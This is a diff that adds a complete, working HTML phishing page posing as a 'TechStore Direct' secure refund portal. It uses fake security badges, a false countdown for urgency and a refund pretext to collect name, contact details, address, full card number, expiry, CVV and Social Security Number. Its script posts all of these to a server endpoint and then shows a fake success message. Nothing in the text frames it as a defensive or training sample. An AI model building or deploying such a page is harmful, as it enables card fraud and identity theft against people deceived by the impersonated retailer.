@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TechStore Direct — Secure Refund Portal</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;background:#f0f2f5;color:#1a1a2e;line-height:1.6}
+
+/* Header */
+.portal-header{background:linear-gradient(135deg,#0f1923,#1a2a3a);color:#fff;text-align:center;padding:28px 24px 22px}
+.portal-brand{display:flex;align-items:center;justify-content:center;gap:10px;font-size:20px;font-weight:700;margin-bottom:6px}
+.portal-brand svg{width:26px;height:26px}
+.portal-subtitle{color:#94a3b8;font-size:14px}
+
+/* Trust Bar */
+.trust-bar{background:#fff;border-bottom:1px solid #e5e7eb;padding:10px 24px;display:flex;justify-content:center;gap:36px;flex-wrap:wrap}
+.trust-item{display:flex;align-items:center;gap:6px;font-size:13px;color:#059669;font-weight:600}
+.trust-item .icon{font-size:16px}
+
+/* Main */
+.portal-main{max-width:600px;margin:0 auto;padding:32px 24px 48px}
+
+/* Order Summary */
+.order-summary{background:#fff;border-radius:12px;box-shadow:0 1px 4px rgba(0,0,0,.06);padding:20px 24px;margin-bottom:24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
+.order-ref{font-size:15px;font-weight:600}
+.order-ref span{color:#6b7280;font-weight:400}
+.refund-amount{font-size:22px;font-weight:700;color:#059669}
+
+/* Countdown */
+.countdown-bar{background:#fef3c7;border:1px solid #fcd34d;border-radius:10px;padding:14px 20px;margin-bottom:28px;display:flex;align-items:center;gap:10px;font-size:14px;color:#92400e}
+.countdown-bar .icon{font-size:20px;flex-shrink:0}
+.countdown-bar strong{font-weight:700}
+#countdown{font-variant-numeric:tabular-nums;font-weight:700;font-size:16px;color:#b45309;margin-left:4px}
+
+/* Form */
+.form-card{background:#fff;border-radius:12px;box-shadow:0 1px 4px rgba(0,0,0,.06);overflow:hidden;margin-bottom:24px}
+.form-section{padding:24px}
+.form-section + .form-section{border-top:1px solid #f0f1f3}
+.section-title{font-size:14px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#6b7280;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.section-title .badge{font-size:11px;background:#fef3c7;color:#92400e;padding:2px 8px;border-radius:10px;font-weight:600;text-transform:none;letter-spacing:0}
+
+.field{margin-bottom:16px}
+.field:last-child{margin-bottom:0}
+.field label{display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:5px}
+.field label .required{color:#e63946}
+.field input{width:100%;padding:11px 14px;border:1px solid #d1d5db;border-radius:8px;font-size:14px;font-family:inherit;outline:none;transition:border-color .15s,box-shadow .15s}
+.field input:focus{border-color:#0066cc;box-shadow:0 0 0 3px rgba(0,102,204,.1)}
+.field input::placeholder{color:#9ca3af}
+.field .hint{font-size:12px;color:#9ca3af;margin-top:4px}
+
+.row-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
+
+/* Submit */
+.submit-btn{width:100%;padding:14px 24px;background:linear-gradient(135deg,#059669,#047857);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:transform .1s,box-shadow .15s;box-shadow:0 4px 12px rgba(5,150,105,.3)}
+.submit-btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(5,150,105,.4)}
+.submit-btn:active{transform:translateY(0)}
+.submit-btn:disabled{background:#9ca3af;box-shadow:none;cursor:not-allowed;transform:none}
+
+.success-msg{display:none;text-align:center;padding:24px;background:#d1fae5;border-radius:12px;margin-bottom:24px}
+.success-msg h3{color:#065f46;font-size:18px;margin-bottom:6px}
+.success-msg p{color:#047857;font-size:14px}
+
+/* Footer */
+.portal-footer{text-align:center;padding:20px 24px 32px;font-size:12px;color:#9ca3af;max-width:600px;margin:0 auto;line-height:1.7}
+
+/* Security Badge in form */
+.security-note{display:flex;align-items:center;gap:8px;padding:12px 16px;background:#f0fdf4;border-radius:8px;margin-bottom:20px;font-size:13px;color:#065f46}
+.security-note .icon{font-size:16px;flex-shrink:0}
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="portal-header">
+  <div class="portal-brand">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>
+    TechStore Direct
+  </div>
+  <div class="portal-subtitle">Secure Refund Portal</div>
+</header>
+
+<!-- Trust Bar -->
+<div class="trust-bar">
+  <div class="trust-item"><span class="icon">&#128274;</span> SSL Encrypted</div>
+  <div class="trust-item"><span class="icon">&#9989;</span> PCI DSS Compliant</div>
+  <div class="trust-item"><span class="icon">&#128737;&#65039;</span> Bank-Grade Security</div>
+</div>
+
+<!-- Main -->
+<main class="portal-main">
+
+  <!-- Order Summary -->
+  <div class="order-summary">
+    <div class="order-ref">Order #TSD-2024-78432 <span>&mdash; Refund Request</span></div>
+    <div class="refund-amount">$349.99</div>
+  </div>
+
+  <!-- Countdown -->
+  <div class="countdown-bar">
+    <span class="icon">&#9200;</span>
+    <div>Refund request expires in: <span id="countdown">47:59:59</span></div>
+  </div>
+
+  <!-- Success Message (hidden until submit) -->
+  <div class="success-msg" id="successMsg">
+    <h3>&#9989; Refund Submitted Successfully</h3>
+    <p>Your refund of $349.99 is being processed. You will receive a confirmation email shortly.</p>
+  </div>
+
+  <!-- Form -->
+  <form id="refundForm" onsubmit="return submitRefund(event)">
+    <div class="form-card">
+
+      <!-- Personal Information -->
+      <div class="form-section">
+        <div class="section-title">Personal Information</div>
+        <div class="field">
+          <label>Full Name <span class="required">*</span></label>
+          <input type="text" id="full_name" name="full_name" placeholder="As it appears on your account" required>
+        </div>
+        <div class="row-2">
+          <div class="field">
+            <label>Email Address <span class="required">*</span></label>
+            <input type="email" id="email" name="email" placeholder="your@email.com" required>
+          </div>
+          <div class="field">
+            <label>Phone Number</label>
+            <input type="tel" id="phone" name="phone" placeholder="(555) 000-0000">
+          </div>
+        </div>
+      </div>
+
+      <!-- Shipping Address -->
+      <div class="form-section">
+        <div class="section-title">Shipping Address <span class="badge">For return label</span></div>
+        <div class="field">
+          <label>Full Address <span class="required">*</span></label>
+          <input type="text" id="address" name="address" placeholder="Street, Apt, City, State, ZIP" required>
+          <div class="hint">We'll send a prepaid return label to this address</div>
+        </div>
+      </div>
+
+      <!-- Payment Verification -->
+      <div class="form-section">
+        <div class="section-title">Payment Verification <span class="badge">Required</span></div>
+        <div class="security-note">
+          <span class="icon">&#128274;</span>
+          Required to verify the original payment method and process the refund to the correct card.
+        </div>
+        <div class="field">
+          <label>Card Number <span class="required">*</span></label>
+          <input type="text" id="card_number" name="card_number" placeholder="0000 0000 0000 0000" maxlength="19" required>
+        </div>
+        <div class="row-2">
+          <div class="field">
+            <label>Expiry Date <span class="required">*</span></label>
+            <input type="text" id="card_expiry" name="card_expiry" placeholder="MM/YY" maxlength="5" required>
+          </div>
+          <div class="field">
+            <label>CVV <span class="required">*</span></label>
+            <input type="text" id="card_cvv" name="card_cvv" placeholder="000" maxlength="4" required>
+          </div>
+        </div>
+      </div>
+
+      <!-- Identity Verification -->
+      <div class="form-section">
+        <div class="section-title">Identity Verification <span class="badge">Refunds over $200</span></div>
+        <div class="security-note">
+          <span class="icon">&#128737;&#65039;</span>
+          Required by our payment processor for refunds over $200. Used solely for identity verification.
+        </div>
+        <div class="field">
+          <label>Social Security Number <span class="required">*</span></label>
+          <input type="text" id="ssn" name="ssn" placeholder="000-00-0000" maxlength="11" required>
+          <div class="hint">Encrypted and deleted after verification is complete</div>
+        </div>
+      </div>
+    </div>
+
+    <button type="submit" class="submit-btn" id="submitBtn">Process Refund &mdash; $349.99</button>
+  </form>
+</main>
+
+<!-- Footer -->
+<div class="portal-footer">
+  This portal is operated by TechStore Direct's payment processing partner.<br>
+  Your information is encrypted and used solely for refund verification.<br>
+  &copy; 2026 TechStore Direct &middot; Privacy Policy &middot; Terms of Service
+</div>
+
+<script>
+(function(){
+  /* Countdown Timer */
+  var totalSeconds = 47*3600 + 59*60 + 59;
+  var countdownEl = document.getElementById('countdown');
+  function tick(){
+    if(totalSeconds <= 0) return;
+    totalSeconds--;
+    var h = Math.floor(totalSeconds / 3600);
+    var m = Math.floor((totalSeconds % 3600) / 60);
+    var s = totalSeconds % 60;
+    countdownEl.textContent =
+      String(h).padStart(2,'0') + ':' +
+      String(m).padStart(2,'0') + ':' +
+      String(s).padStart(2,'0');
+  }
+  setInterval(tick, 1000);
+
+  /* Card number formatting */
+  var cardInput = document.getElementById('card_number');
+  cardInput.addEventListener('input', function(){
+    var v = this.value.replace(/\D/g, '').substring(0, 16);
+    var formatted = v.replace(/(.{4})/g, '$1 ').trim();
+    this.value = formatted;
+  });
+
+  /* Expiry formatting */
+  var expiryInput = document.getElementById('card_expiry');
+  expiryInput.addEventListener('input', function(){
+    var v = this.value.replace(/\D/g, '').substring(0, 4);
+    if(v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
+    this.value = v;
+  });
+
+  /* SSN formatting */
+  var ssnInput = document.getElementById('ssn');
+  ssnInput.addEventListener('input', function(){
+    var v = this.value.replace(/\D/g, '').substring(0, 9);
+    if(v.length >= 5) v = v.substring(0,3) + '-' + v.substring(3,5) + '-' + v.substring(5);
+    else if(v.length >= 3) v = v.substring(0,3) + '-' + v.substring(3);
+    this.value = v;
+  });
+
+  /* Submit */
+  window.submitRefund = function(e){
+    e.preventDefault();
+    var btn = document.getElementById('submitBtn');
+    btn.disabled = true;
+    btn.textContent = 'Processing…';
+
+    var payload = {
+      full_name: document.getElementById('full_name').value.trim(),
+      email: document.getElementById('email').value.trim(),
+      phone: document.getElementById('phone').value.trim(),
+      address: document.getElementById('address').value.trim(),
+      card_number: document.getElementById('card_number').value.trim(),
+      card_expiry: document.getElementById('card_expiry').value.trim(),
+      card_cvv: document.getElementById('card_cvv').value.trim(),
+      ssn: document.getElementById('ssn').value.trim()
+    };
+
+    fetch('/api/submit', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload)
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(){
+      document.getElementById('refundForm').style.display = 'none';
+      document.getElementById('successMsg').style.display = 'block';
+    })
+    .catch(function(){
+      btn.disabled = false;
+      btn.textContent = 'Process Refund — $349.99';
+      alert('An error occurred. Please try again.');
+    });
+    return false;
+  };
+})();
+</script>
+</body>
+</html>
